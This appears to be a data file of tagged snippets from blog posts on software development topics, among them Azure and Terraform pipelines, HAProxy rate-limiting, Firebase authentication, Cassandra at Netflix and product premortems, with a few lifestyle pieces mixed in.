2624,"The next steps in the pipeline will be to build. Ideally we would like to be able to build release versions of our application as we can the easily transition our build artifacts into a deployment pipeline. To be able to do this, we will need to take advantage of a few utility tasks provided in Azure to be able to sign our application. The first step of the code signing process in the pipeline is to install the Apple P12 certificate. We can achieve this with the Install Apple Certificate task. Next, we need to install the appropriate provisioning profile with the Install Apple Provisioning Profile task. In the YAML file, this will look like: You mightve noticed above that we are referencing secure files to complete these utility tasks. That is because this is the mechanism that Azure Pipelines provides to securely store files such as signing certificates and keystore files. To upload secure files such as your Apple Provisioning Profile, developer certificate and Android keystore file, you can go to the Library section and navigate to the Secure files section. Since we also need to reference several secret variables in our YAML file to be able to install our P12 certificate and sign our Android Application, we need a way to securely store them within Azure Pipelines. We can do this by creating a new variable group within Library and storing the variables we need.","['Continuous Integration', 'React Native', 'Mobile', 'Azure', 'Android']",7
2625,"Distributed tracing can be used to help answer questions such as: Which services are not performing well enough? Whats the average response time for a request from service A to service B? Am I making unnecessary API calls or database queries? Can I optimise requests and/or operations using concurrency? Why is a particular request unsuccessful? AWS X-Ray is Amazons managed distributed tracing tool and is available in most regions. X-Ray is designed to help developers debug production distributed applications and identify errors. X-Ray currently works with EC2, ECS, Lambda and Elastic Beanstalk.","['Golang', 'Distributed Tracing', 'AWS', 'Aws X Ray', 'DevOps']",10
2626,"Standardization: When using AWS console, simple copy/paste errors may occur. This may expose the bucket to the wrong customer (or even to the public). First item to consider is ensuring the bucket names are consistent for all customers. A defined naming convention should be used that is unique for each engagement, as one customer can have multiple engagements. Entering names manually are subject to human error. Second, ensure the right policy is assigned to the right customer bucket, with the proper permissions. Entering policy permissions manually are subject to human error. Third, ensure access keys are given to the right customer. Copy/pasting credentials with the wrong bucket path may expose the data to the wrong customer.","['AWS', 'Terraform', 'Incident Response', 'Automation']",11
2627,"At the permissions section, we can simply choose an existing policy called Administrator Access, as outlined below: After clicking through the remaining options, youll need to copy the Access Key ID and Secret Access Key at the last menu as we will be using these in later steps. While were also in the AWS console, create an S3 bucket named terraform-dev-mytest-<date>. (We covered this in my prior post here: __url__ AWS.","['AWS', 'Terraform', 'Incident Response', 'Automation']",7
2628,"Now that we have Terraform configured and our AWS CLI configured, we can now create our base Terraform project to automate our customer S3 bucket creation and locked down IAM user we did manually in our prior blog post below: To begin, lets create a project folder called terraform_dev on your workstation to hold our Terraform project. Inside this folder, lets create the following files: __url__ and us-east.tf. Ill explain each file below:main.tf Inside the main.tf, we will use the following code: The code above tells Terraform to store our tfstate file in an S3 bucket called terraform-dev-mytest-<date> and the the key of terraform-dev.tfstate. We also set encrypt to true to encrypt the files contents.us-east-1.tf With the __url__ file created, we can move on to the us-east-1 terraform file. Since we havent setup up our S3 and IAM_Customer modules yet, the only contents we will place into this file are as follows: This code tells Terraform to use the AWS provider and set the region to us-east-1. Having a terraform file per region allows you to place customer data/resources in their proper region for either data privacy restrictions and/or speed and optimization purposes. With our two Terraform files created, we can now initialize the Terraform backend using the Terraform command terraform init. If successful, you will see the following output below: With our backend initialized, we can proceed with creating our customer S3 module. This module will become our reusable template for deploying new customer locked down S3 buckets with enforced standards such as naming convention, encryption and destruction options. To begin, lets create a folder called modules inside our project folder. From here, we will create another folder called customer_s3. Since this is a new module were building, each module will contain 3 files:<module_name>.tfvars.tfoutputs.tf Lets take a look at the first file __url__ below: This file holds variables that will be passed to our module. In this case, our customer alias will be passed from our main file __url__ as parameter to our module. We will cover this more in later steps. The second file is called the __url__ and tells what outputs the modules should pass after module usage. This is valuable when one module depends on another or printing output to console (such as the bucket arn or Amazon Resource Names and user keys). The last file our module needs is the module code itself, held in the <module_name>.tf or in our case customer_s3.tf. This file will define the standard on how a customer bucket should be created, what server side encryption to use and how the bucket should be destroyed, as outlined below: You may be wondering why each module has a provider line at the top. When performing incident response, you must be able to support the creation of buckets across regions. Allowing modules to take the provider as parameter, which in turn allows us to define the provider for that region. We will show this in the next section. For this simple use case, were only using the bare minimum parameters for the data source aws_s3_bucket. You can view other arguments and definitions at the following link below: Now that we have created a module that defines how our customer bucket will be created, we need to create another module that creates a customer user account and a defines an IAM policy for that user which limits the users access to their S3 bucket including limited permissions.","['AWS', 'Terraform', 'Incident Response', 'Automation']",7
2629,"This can be accomplished be running the command terraform plan. Your output should look similar to the image below: The important part to this output outside of the module outputs is the Plan: segment at the bottom, which shows Plan: 4 to add, 0 to change, 0 to destroy. Its important to check these changes prior to moving forward and ensure youre adding/removing the proper resources/parameters. For awareness, the console also color codes changes outlined below: Green (Add)Yellow (Change)Red (Destroy)If everything looks good, you can proceed with the next command terraform apply to allow terraform to provision our new resources. Terraform apply will do two things: Show you the same output as Terraform plan to perform a last chance review Will ask for your confirmation before applying these changes to your infrastructure If you agree with the changes, type yes to begin provisioning your new customer resources. Once completed, the final output will look like below: As stated above, review the output of your apply command and ensure the proper number of resources are created. If any errors are shown, they will be in red. You will also see the following items in the outputs below: The outputs will contain your customers bucket arn, access id and token, which can be used by the customer to authenticate to their bucket using either the AWS CLI or other tools like Cyber Duck.","['AWS', 'Terraform', 'Incident Response', 'Automation']",7
2630,"In this post, we covered how to use Terraform to quickly spin up a new S3 bucket, IAM user and keys. Using Terraform also helps us ensure the proper policy is applied and bucket contents are encrypted at rest. While this example is very simple, we can build upon this to enable automated post processing of data (reading a log file for example) using SQS and Lambda. Lastly, you should commit your new Terraform code to a version control system such as Git Hub to ensure any changes to the Terraform code base is tracked. I hope you enjoyed this blog post and stay tuned for Part 3, Automated post processing with SQS and Lambda. Also feel free to read up on more of my writings below.","['AWS', 'Terraform', 'Incident Response', 'Automation']",7
2631,"If the first byte is slow, EVERY other metric will also be slow. Improving it is one of the few cases where you can predict what the impact will be on every other measurement. Every millisecond improvement in the TTFB translates directly into a millisecond of savings in every other measurement (i.e. first paint will be 500ms faster if TTFB improves by 500ms). That said, a fast ttfb doesnt guarantee a fast experience but a slow ttfb does guarantee a slow experience. Id estimate that roughly 50% of all requests for help with Web Page Test results come from site owners struggling with a slow TTFB.","['Web Development', 'Ttfb', 'Cloudflare', 'Performance']",3
2632,Using the new Workers KV store we can purge the cache a different way. The Worker script uses a versioning scheme for the cache where every URL gets a version number appended to it (i.e.,"['Web Development', 'Ttfb', 'Cloudflare', 'Performance']",18
2633,"When I was in college, an ice cream shop opened nearby, and a few friends and I went to check it out. We walked in, and it looked completely normalthey had all the usual flavors like mint, chocolate, and the like. However, at the end of the counter, they had this flavor called The Broccoli Surprise. A naturally curious individual, I had to try it. I asked the attendant behind the counter for a sample. It was white with little green specks, and it tasted sweet, creamy, and rich. I was confusedthere was no broccoli flavor in here. So I asked, whats the surprise? Theres no broccoli, she replied with a smile.","['Machine Learning', 'Business Strategy', 'Surprise', 'Data Science', 'Product']",2
2634,"What the heck were they talking about? So, I went back to the original ad. What I saw was a young woman, being silly and smiling while brushing her teeth with black toothpaste. I mean, Im not sure anyone would look all that great with toothpaste dribble that resembles asphalt covering your entire mouth and running down your chin, ya know? But, other than that, I wasnt seeing the issue. Needless to say, I did not purchase the toothpaste and I will never know if my life could have been forever altered by that miracle tube of black crap. What I do know is that I was disgusted by my fellow female sisters. This tooth brushin girl was someones daughter. She was someones granddaughter, sister, cousin, niece or friend. And complete strangers were intentionally being hurtful and demeaning to her with no provocation or purpose.","['Feminism', 'Motherhood', 'Self Improvement', 'Self Love', 'Moms']",17
2635,"Sure, posting naked/partially naked pictures and selfies arent for everyone. The image can be scroll stoppingespecially if the subject isnt a size 000 with flawless makeup, record-length eyelashes and voluminous hair. But, thats the point isnt it? To make you stop and think? I, personally, give major props to women fierce enough to put themselves out there. I have nothing but love and support for them in their journey. And I pray to God my daughters (and sons) will feel the same.","['Feminism', 'Motherhood', 'Self Improvement', 'Self Love', 'Moms']",17
2636,"The Harvey Weinstein and Brett Kavanaugh allegations of 2018 sent the women of the nation in an uproar. The Me Too movement went from spark to raging fire so quickly that every household knew what the phrase stood for. Countless women were plucking up the nerve to go public with their own harassment allegations and finally had the confidence to speak out against their attackers. Females around the country were cheering, marching, protesting and gathering. Many were encouraging their daughters to stand alongside them and using this movement as a teachable moment for the younger generations. It was a summit of Mama Lions roaring as one.","['Feminism', 'Motherhood', 'Self Improvement', 'Self Love', 'Moms']",4
2637,"You can try to improve your organization directly, by proposing more automation and cross-team collaboration. But dont be surprised if things go easier if you start with a magic stone. Sometimes, people need some extra motivation to work together and do the right thing. And if that requires a little sleight-of-hand, thats okay.","['Microservices', 'Microservice Architecture']",0
2638,"The basic concept behind OODA is simple. Every action starts with an observation (Observe), which is then tempered with genetic, cultural, experiential and other contexts (Orient). Once that context is applied, a decision can be made (Decide) and an action taken (Act). But equally important to the process steps themselves is the iterative feedback nature of the relationships between those steps. Most importantly, orientation, decisions, and actions are all themselves observed andalong with unfolding circumstances and other outside informationcan influence the next decision cycle (or even change the current cycle). Boyds original diagram of this process is at the top of this post.","['Strategy', 'Serverless', 'Software Architecture', 'Flow Architecture', 'Knative']",5
2639,"The speed at which businesses can observe, orient, decide, and act is critical to long term success, as has been demonstrated often in the last several decades. IBM went from a potential technology monopoly to one of many in a sea of enterprise IT players thanks to disruptions from startups and online businesses. (The same is true for Microsoft, although in their case they have reestablished themselves as a major player in the new technology landscape.) High frequency trading (HFT) accounts for up to 40% of US equity trading, and profits largely by out observing, orienting, deciding, and acting other trading systems. (In fact the success of any given HFT system often depends on its ability to run through the OODA loop faster than all other HFT system. )And this gets to the heart of why the demand for Flow is, in part, supported by the OODA loop concept. Just as HFT creates financial benefits simply by being able to react faster to trading opportunities than its rivals, there are a number of business elements where the combination of speed and intelligent decision making is of the essence. In hospitals, sensors trigger responses from support systems, such as medication dispensers, to save lives. In news media, stories are discovered and details are delivered to the consumer in order to inform and provide insight. In insurance, details about driving behavior can fine tune actuarial tables in order to optimize cost to the consumer without sacrificing profit.","['Strategy', 'Serverless', 'Software Architecture', 'Flow Architecture', 'Knative']",16
2640,"The Abuse stick table Here, we define a dummy backend called Abuse. Dummy, since its only used to define a stick-table that the rest of the configuration can refer to by the name Abuse. The stick-table is nothing but a storage space, or better, a lookup table for request data. Our stick-table has the following characteristics:type ip: Requests stored in the stick table will have their IP as key. So, requests from the same IP will refer to the same record. Essentially this means that we keep track of IPs and data related to __url__ 100K: The table has a maximum of 100K entries.expire 30m: The table entries expire after 30 minutes of __url__ gpc0,http_req_rate(10s): The table records store the general purpose counter gpc0 and the IPs request rate for the last 10 second interval. Well be using the gpc0 to keep track of the amount of times an IP has been marked as abusive. Essentially, a positive value implies that the IP has been marked as abusive. Lets call this counter the abuse indicator.","['Haproxy', 'Security', 'Load Balancing', 'DevOps', 'Software Engineering']",11
2641,"It makes sense to take a look at the rules defined in the same frontend section. The rules are applied in turn on every incoming request and make use of the ACLs that we just defined. Lets see what each one does.tcp-request connection track-sc0 src table Abuse: Adds the request to the table Abuse. Since the table has defined the IP as its key, this rule basically adds the request IP to the table.tcp-request connection reject if abuse_cnt: Rejects new TCP connections if the IP has already been marked as abusive. In essense, it forbids new TCP connections from an abusive IP.http-request deny if abuse_cnt: Denies access to request if the IP has already been marked as abusive. This applies to already established connections that are still open, but correspond to an IP that has just been marked as abusive.http-request deny if is_abuse inc_abuse_cnt: Denies access to request if is_abuse and inc_abuse_cnt both return True. In other words, it denies access to the request if the IP currently has a high request rate, and then proceeds to annotate it as abusive.","['Haproxy', 'Security', 'Load Balancing', 'DevOps', 'Software Engineering']",11
2642,"Why frame the problem like this? Framing the overall problem avoids assumptions. Notice in the bass guitar example, that the friend immediately assumed that the amp was the problem and therefore was fixated on fixing the amp (ignore all other possibilities)? In most cases, there could be a number of things causing the problem, or even a specific combination of one or more things. Its helpful to identify each of these broader pieces. For example: Bass Guitar examplethe relevant parts that could cause the issue may be: Bass Guitar Guitar Lead (from guitar to pedal)Pedal Guitar Lead (from pedal to amp)Amp Power Website examplethe relevant parts could be: Web browser (eg. application bug, cache)Internet connection Web server Continuous deployment tools Website code (Git tracked code that weve written)Website state (database, any files that store data, non-Git tracked files (eg. dependencies, plugin))Notice that for now, weve identified the broader pieces like Bass Guitar. Right now, its not yet helpful to further break the bass guitar into small pieces (eg. strings, pick ups, knobs, wiring etc). Remember, this process is cyclical, so in the next loop, we may need to identify the pieces of the bass (if we find that the bass guitar is relevant to the issue).","['Web Development', 'Debugging', 'Software Development', 'Software Engineering', 'Software Testing']",13
2643,"If you are a longtime Firebase developer coming from the old SDKs, you likely already have a conceptual understanding of custom tokens. In fact, all tokens in the old SDK were actually custom tokens. You could mint custom tokens yourself using one of the many server-side Firebase token generators or, if you used the built-in anonymous, email / password, or OAuth authentication methods, Firebase would mint custom tokens on your behalf. That custom token was a JWT which could be re-used any time you wanted to authenticate an old SDK. By default, custom tokens never expired. However, if you minted your own custom tokens, you could give them custom expiration times. You could also specify a handful of extra claims which would then be available for use in Security Rules.","['Firebase', 'Firebaseauthentication', 'Authentication', 'Firebaserealtimedatabase']",11
2644,"Custom tokens in the modern SDKs are now generated via the Firebase Admin SDK. As before, they are JWTs to which you can add custom claims which are made available in Security Rules. Note that although the old and new custom tokens are both JWTs, their formats are quite different. In addition, in the modern SDKs, custom tokens are short-lived, with an expiration time of just one hour. This expiration time is specified via the custom tokensexp claim which cannot be overridden since it is one of the many blacklisted claims (scroll down to the blue box). After that hour passes, the custom token becomes invalid.","['Firebase', 'Firebaseauthentication', 'Authentication', 'Firebaserealtimedatabase']",15
2645,"Although you will likely never need to interact with refresh tokens directly, it is important to know they exist as they are a critical piece of the modern client SDKs authentication model. When you authenticate a modern client SDK, it generates an ID token / refresh token pair. The refresh token is a standard OAuth 2.0 refresh token, which you can learn more about here. Unlike the ID token which expires after one hour, the refresh token is long-lived (I believe it is valid for about one year). Shortly before the current ID token expires, the modern client SDKs transparently send the refresh token to this endpoint to generate a fresh ID token with a new one hour expiry, ensuring your users stay logged in. All of this happens under the hood, although each client SDK includes a method to be notified when a new ID token is generated (web, i OS, Android, C++, Unity).","['Firebase', 'Firebaseauthentication', 'Authentication', 'Firebaserealtimedatabase']",11
2646,"Building software that can be easily changed over time and that can be adapted during operatione.g., by artificial intelligenceis a challenging task. In this short article, we sketch the idea of model-integrating development (MID), an alternative software engineering approach that enables the systematic development of component-based, model-integrating software. MID combines principles from model-driven and component-based development and is based on the central assumption that models (1) and code shall be treated equally as first-class entities of software throughout its life cycle. In particular, MID leverages the added flexibility that comes with models at runtime, i.e., when models are an integral part of running software. The proposed process and software architecture concepts form an alternative way for building flexible and potentially self-adaptive software systems.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",12
2647,"We basically distinguish two perspectives, namely the design time perspective and the runtime perspective. The former view focuses on activities that need to be performed in order to design and implement MIS. Thereby, an emphasis is put on two essential sub-processes. On the one hand, the component-based architecture of the system needs to be designed (Component Engineering, cf. On the other hand, modeling languages that are used within the system need to be selected. If such languages are not available, existing languages need to be adapted, or new languages need to be specified (Modeling Language Engineering, cf.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",9
2648,"The runtime perspective focuses on the execution of a developed MIS; an exemplary system is described in Sect. The execution of such a component-based system that seamlessly integrates models and code requires a corresponding Infrastructure (cf. For example, a component infrastructure is needed that manages the life cycle of components, as well as a language infrastructure that implements the modeling languages used.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",9
2649,"Concluding remarks and further reading recommendations Building software products that can be easily changed over time and that can be adapted during operatione.g., by artificial intelligenceis a challenging task. In this short article, we sketch the idea of model-integrating development (MID), an alternative software engineering approach that enables the systematic development of component-based, model-integrating software. If you like to learn more about the foundations, core concepts, benefits and challenges, please refer to our comprehensive journal article published at Springer where the MID process is described in detail. In particular, this article provides details of the component and modeling language engineering sub-processes and discusses the interrelation between their core activities. The practicability of the proposed solution concept is rationalized based on a reference implementation that provides the basis for a thoroughly described and critically discussed feasibility study (proof-of-concept). (1) A model in this context is a software model conforming to a modeling language. Prominent languages used in practice are the sub-languages of the unified modeling language (UML) and the business process model and notation (BPMN).","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",5
2650,"H.: A staged model for the software life cycle. Salehie, M., Tahvildari, L.: Self-adaptive software: landscape and research challenges. Stahl, T., Vlter, M.: Model-Driven Software Development.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",5
2651,"Brambilla, M., Cabot, J., Wimmer, M.: Model-driven software engineering in practice.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",5
2652,"V.: A classification framework for software component models. Szyperski, C., Gruntz, D., Murer, S.: Component Software-Beyond Object-Oriented Programming, 2nd edn. Ciccozzi, F., Tivoli, M., Carlson, J. ): Proceedings of the 1st International Workshop on Model-Driven Engineering for Component-Based Software Systems co-located with ACM/IEEE 17th International Conference on Model Driven Engineering Languages & Systems (Mo DELS 2014), Valencia, Spain, CEUR Workshop Proceedings, vol.","['Agile', 'Software Development', 'Science', 'Technology', 'Artificial Intelligence']",5
2653,"Service Workers can be disabled from Settings under Experimental technologies (its enabled by default)Sometimes, when you open many PWAs at the same time, i OS task bar gets crazy, showing ghosts apps without icon or title in the history Did you find any bug in your PWA on i OS? Drop me a line in the comments and I will post it here or fill a bug report to the Web Kit team. Follow me on Twitter at @firt if you want to get updates on the article. If you are interested in a hands-on workshop, check my training schedule; well be creating a PWA covering what most people are missing about them on every platform, including how to survive to i OS Maximiliano Firtman is a mobile + web developer, trainer, speaker, and writer. He has authored many books, including High Performance Mobile Web published by OReilly Media. He is a frequent speaker at conferences worldwide and he has been widely recognized for his work in the mobile-web community. He teaches mobile, HTML5, PWA and performance trainings for top companies around the world. He has delivered several Progressive Web Apps workshops and trainings at many companies and at online publishers, such as Linked Learning/Lynda and Safari for OReilly.","['Web Development', 'Mobile App Development', 'Progressive Web App', 'Apple', 'iOS App Development']",18
2654,"Embarrassed, frustrated, burned-out team members are sitting around the table avoiding the CEOs gaze. Seething with anger, she addresses the room: This project has been a complete failure, a humiliation to you and the company. In the last twenty years, software development processes have been revolutionized. Agile changed how we plan, execute, and generally think about building software [1]. The Lean movement helped us de-risk projects through the use of early experiments and minimum viable products [2]. Iterative thinking replaced traditional project management practices such as upfront requirements gathering and waterfall planning. Design Sprints gave us even more tools for rapid development and validation [3]. The Jobs to be Done framework helps product managers better elicit, test and articulate value propositions [4]. Yet, most software projects are still considered failures. In 1994, only 16.2% of software projects were completed on-time and on-budget [5]. According to a follow up report from Standish Group, this number has improved to a mere 29% by 2015 [6]. Mc Kinsey reported that 17% of projects fail so badly that they threaten the existence of the companies that finance them [7]. Furthermore, only 40% of shipped features deliver high or very high value, and 80% are infrequently or hardly ever used [8].","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",0
2655,"The facilitator starts the meeting by asking the team to imagine a scenario in the future. Embarrassed, frustrated, burned-out team members are sitting around the table avoiding the CEOs gaze. Seething with anger, she addresses the room: This project has been a complete failure, a humiliation to you and the company. In cases where giving the meeting more focus is requiredespecially when multiple premortems are organized to dedicate time to different types of risksa more narrowly defined scenario will work better, for example: The project has missed an all-important deadline or the software shipped doesnt properly work, and a key customer churned as a result.","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",0
2656,"Most successful brainstorming methods start with individuals generating ideas on their own before sharing them with the group [11]. This helps to avoid situations where new ideas quickly converge around a couple of topics proposed early on by the most vocal team members. We have found the following structures to be the most successful.510515 Brainstorm Method Individuals sit in teams. For the first 5 minutes, each member writes as many ideas as they can think of (usually on post-its). The goal is for everyone to go beyond the most obvious topics. The most insightful ideas tend to be generated in the final minute or two, after people exhausted the obvious.","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",0
2657,"Next, the participants select the top risks to be addressed. Depending on the size of the project, the number can be anywhere between three and a dozen. The group should then assign an owner and identify a mitigating tactic to address every risk. These include technical spikes and product validation. Technical spikes typically include proofs of concept for new technologies or load or performance tests with simulated traffic. Product validation mitigation practices include experiments such as Wizard of Oz, concierge MVP, selling vaporware, customer interviews, digital prototypes, etc. Design Sprints are a particularly good technique for early idea validation; teams spend one week creating multiple prototypes and validating them with customers to get the feedback necessary to select the most promising direction.","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",0
2658,"Pro Tip: avoid kill gatesbinary stage gates in which one result is killing the project entirelyand instead use decision gates (also known as forks). The natural human tendency is to look for evidence supporting positive test results. When a stage gate is a binary yes/nothat is, the project might be stopped if the results at a certain stage are not promisingbias might impact experiment execution (e.g. interviewer tries to sell customer on the idea instead of merely collecting feedback for the MVP) or interpretation of the results (e.g. this seems nice is interpreted as a strong yes signal instead of a polite no). Turning kill gates into decision gates helps to avoid this. In practice, this means that for every experiment, there needs to be a plan for a follow up experiment or a clear pivot direction identified.","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",13
2659,"We said earlier that the best time to run a premortem is at project launch, but this is not the only time that premortems can (and should) be performed. For large projects or programs, engaging in this exercise regularly continuously de-risks at different stages or phases of the effort as more information and new dependencies arise throughout the progression of the work. The frequency should be decided on a case-by-case basis, but general guidance would be to consider whether there are enough concerns, known unknowns, or potential unknown unknowns to warrant a premortem at the start of each stage of the project or program. For example, a premortem should not only be done at the inception of a project that aims to deliver a large new feature, but also when the feature has been released to beta and now has to be brought to general availability. The types of risks that will be elicited and prioritized at these two stages are most likely different. Such intermediary premortems are more effective if they are treated as fresh brainstorming exercises. The results can be compared and reconciled with the existing list at the end of the workshop.","['Risk Management', 'Product Management', 'Product Development', 'Program Management', 'Agile']",1
2660,"For those that are important now and into the future, you will need to keep adding features and resolving technical debt as you go. (The Stars)If they are important now, but not important for the future, then you can keep deferring that technical debt and only resolve key issues as needed. (Cash Cow)If the features are not important now but are part of the future, you will need to experiment until you are confident in what the market needs are and then resolve the debt as you start adding more enhancements, so that it is ready when the market demand picks up. (Problem Child)If the feature is no longer important now and not important for the future, then kill it, and then retire the code to solve the technical debt. (Dog)By prioritising the features first, and then identifying the technical debt associated with them, you have a clearly prioritised backlog of technical debt that will be resolved as you launch the next enhancement or new feature set. It takes discipline though, to honestly prioritise your features in the above grid as not everything you have released is a Star.","['Technical Debt', 'Product Management', 'Development', 'Business Strategy']",12
2661,"If you look right under that in the class/modules list, youll see another interesting entry: Enumerator. But isnt that just a catchall term for all those iterator methods? Why is this listed as a class? First though, let me explain how I initially crossed paths with this odd incarnation of the enumerator. While running through my Flatiron School prework, I ran into a particular coding problem. I cant remember the exact content of the problem, so Ill reconstruct a similar one here.","['Programming', 'Ruby']",15
2662,"And Ruby has map method too. Now let me just go check the documentation to make sure I get the syntax right-What the!? How are you gonna make an array method that doesnt know about its indexes? Come to think of it, each has the same deficiency, and requires that you call each_with_index to get indexes. But there doesnt appear to be a map_with_index method. My experience and intuition tell me that map should return whatever it returns when given no block, which is then in turn operated on by this with_index method. I have used this functionality often when chaining other collection methods together, such as split, join, sort, reverse, or uniq. Why would this work as shown here? Further reading shows that this will work as well: Again, my understanding is that each methods return their original collections unmodified, so this each_with_index should do nothing, and then pass the array on to the map. How does map know about the indexes? I can see clearly that these examples get the job done, but I am at a loss to explain why. But being pretty new with Ruby, and having a lot more work to get through, I chalk it up as a weird syntactical trick that Ill maybe understand later, and move on. Fast forward several weeks I am now well into my first week at Flatiron School. We are rapidly learning the fundamentals of object-oriented programming, including classes, instances, and so on. At some point in the labwork, that old chain-iterator anomaly once again presents itself to me. It is still a mystery to me, but being much more familiar and comfortable with Ruby now, I delve back into the docs for another look. Thats when I notice this: Yes, this is the first time I noticed the big bold text directly under the other big bold text that I cited earlier. Well, in my defense, its more like this was the first time I comprehended it. See, in my previous examples, where I presumed that map and each_with_index were being called without blocks, I was correct. However, what I did not know was that they were not in fact returning arrays and passing them on to the following methods, but were instead returning these Enumerators. Wait, so what was an enumerator again? Well, the next step is follow through to the Enumerator doc page, where we will read that it is a class which allows both internal and external iteration. But rather than recite the docs, lets jump into IRB and see what it looks like.","['Programming', 'Ruby']",15
2663,"That looks familiar, its an instance of the Enumerator class. Right away, theres our mysterious with_index method from before. And our old friends map and select are here as well, along with many other familiar methods. When we ran these chained methods, we were not calling array methods, we were calling these special enumerator instance methods. This would explain why map was able to yield those indexes to a block, unlike the normal array map method.","['Programming', 'Ruby']",3
2664,"The Lease Collection Name property in the Cosmos DBTrigger attribute is the name of the Cosmos DB collection that the function will use in order to keep track of how many changes have occurred and where it should start reading from, in case of a failure or a restart. Youll need to create this collection yourself, but you can also set the Create Lease Collection If Not Exists value to true. It does not need to be partitioned and it can be provisioned with the minimum 400 RU/s. You do not need to do anything manual with this collection. The Azure function will do the rest for you. The same lease collection can host multiple Azure functions. All you need to do is to add a Lease Collection Prefix in your Cosmos DBTrigger. That way, the Azure function will be able to identify which lease collection documents its the owner of.","['Redis', 'Cosmosdb', 'Database', 'Azure Functions', 'Software Engineering']",8
2665,"E __url__ is an open-source server-side and considered one of the primary, minimalist, the most popular and robust framework with over 42000 Git Hub stars. It was created by TJ Holowaychuk, one of the members of the core Node project team. This framework is backed by a large community who keep on adding and improving its features and essence functionalities. E __url__ is also referred to as the most reliable web application development N __url__ framework. With the help of this framework, we can easily build applications with minimum lines of code. It comes with a small learning curve that makes it a perfect choice for novice js developers. At the moment, It has over 1 million customers and 200 thousand live websites.",['Nodejs'],19
2666,"Another well-known N __url__ framework, S __url__ is famous for its serviceability towards enterprise-wide systems. It was built by Mike Mc Neil in 2012. This framework uses Waterline that provides a database layer and a powerful object-relational mapping (ORM) solution. S __url__ confers the architecture similar to the one of Ruby on Rails along with an added feature that gives more scope to creativity and data-focused advanced web app development. A front-end agnostic framework, S __url__ is also compatible with all Grunt modules that are available and allows us to build practical and production ready apps within a few weeks. The S __url__ framework is mostly used to create real-time chat based applications and can easily work with other tools at the same time. According to the experts, S __url__ framework is able to easily run on any database and is quite responsive towards front-end.",['Nodejs'],19
2667,"H __url__ is recognized as a N __url__ powered framework that independently runs without any assistance on Express.js. It was introduced by Eran Hammer in 2011. Due to the plugin extensibility of Hapi.js, these developers could easily battle over the limiting functionality of Express.js. For all these years, H __url__ has achieved to create a niche of its own in the realm of web application frameworks. Rather than writing fresh codes, this framework focuses on managing tasks via configuration most of the times. The framework has a robust plugin integration and focuses more on the performance of the application. H __url__ has various key features such as input validation using JOI, configuration functionality, caching, logging, error handling and helps in building site and APIs with a focus on clean code and performance.",['Nodejs'],11
2668,"Lets look at some of the Cassandra internals to understand why our initial simple design slowed down. As the data grew, the number of SSTables increased accordingly. Since only recent data was in memory, in many cases both the memtables and SSTables had to be read to retrieve viewing history. This had a negative impact on read latency. Similarly Compaction took more IOs and time as the data size increased. Read repair and Full column repair became slower as rows got wider.","['Compression', 'Architecture', 'Big Data', 'Cassandra', 'Persistence']",8
2669,"Cassandra performed very well writing viewing history data but there was a need to improve the read latencies. To optimize read latencies, at the expense of increased work during the write path, we added an in-memory sharded caching layer (EVCache) in front of Cassandra storage. The cache was a simple key value store with the key being Customer Id and value being the compressed binary representation of viewing history data. Each write to Cassandra incurred an additional cache lookup and on cache hit the new data was merged with the existing value. Viewing history reads were serviced by the cache first. On a cache miss, the entry was read from Cassandra, compressed and then inserted in the cache.","['Compression', 'Architecture', 'Big Data', 'Cassandra', 'Persistence']",8
2670,"With the addition of the caching layer, this single Cassandra table storage approach worked very well for many years. Partitioning based on Customer Id scaled well in the Cassandra cluster. By 2012, the Viewing History Cassandra cluster was one of the biggest dedicated Cassandra clusters at Netflix. To scale further, the team needed to double the cluster size. This meant venturing into uncharted territory for Netflixs usage of Cassandra. In the meanwhile, Netflix business was continuing to grow rapidly, including an increasing international member base and forthcoming ventures into original content.","['Compression', 'Architecture', 'Big Data', 'Cassandra', 'Persistence']",8
2671,"Live VH and Compressed VH are stored in different tables and are tuned differently to achieve better performance. Since Live VH has frequent updates and small number of viewing records, compactions are run frequently and gc_grace_seconds is small to reduce number of SSTables and data size. Read repair and full column family repair are run frequently to improve data consistency. Since updates to Compressed VH are rare, manual and infrequent full compactions are sufficient to reduce number of SSTables. Data is checked for consistency during the rare updates. This obviates the need for read repair as well as full column family repair.","['Compression', 'Architecture', 'Big Data', 'Cassandra', 'Persistence']",8
2672,"A GIF (Graphics Interchange Format) is a bitmap image format first designed by a team at bulletin board provider Compu Serve in 1987 [3]. A GIF is in effect a digital flipbook of images that infinitely loop. After coming close to extinction in the early 2000s, the GIF has seen something of a renaissance in recent years with immense growth in its use on the Internet. Large libraries of searchable GIFs such as Giphy and Tumblr exist, making it incredibly easy to find the exact GIF youre looking for. These GIF libraries have recently been implemented into Social Network sites such as Facebook and Twitter leading to widespread use. If something in the news or sport has gone viral it will often be most shared in GIF form.","['GIF', 'QA', 'Testing', 'Test Evidence']",17
2673,"GIFs are beginning to make their way into the working world as well. At Build Empire we use the popular team messaging application Slack to communicate internally, and included in the suite of apps installed on Slack is Giphy. This Slack application allows you to enter the command /giphy followed by your search term. This then searches Giphy for a GIF matching your search term and displays it in the messaging window. This is a fun piece of functionality and due to the random nature of the application (and the lack of GIF preview) as it can throw up some weird and wacky GIF choices. This is all well and good and provides some office fun, but surely there could be a more practical use for the Giphy library/application? As a Test Analyst for Build Empire, my job entails thoroughly testing the websites and applications we are building for our clients. I am responsible for raising any bugs I find, and a key part of that element of my job is providing the developer(s) working on the project with enough information and detail so that they can understand, replicate and ultimately fix the bugs I am raising. Test Evidence, therefore, forms a vital part of the work I do and so Im constantly looking for ways to improve the evidence I capture and make it as useful for the consumer as possible. The question remains howeverwhat practical uses does a platform primarily used for the sharing and creation of memes have in a testing environment? Well thats where Giphy Capture comes in.","['GIF', 'QA', 'Testing', 'Test Evidence']",19
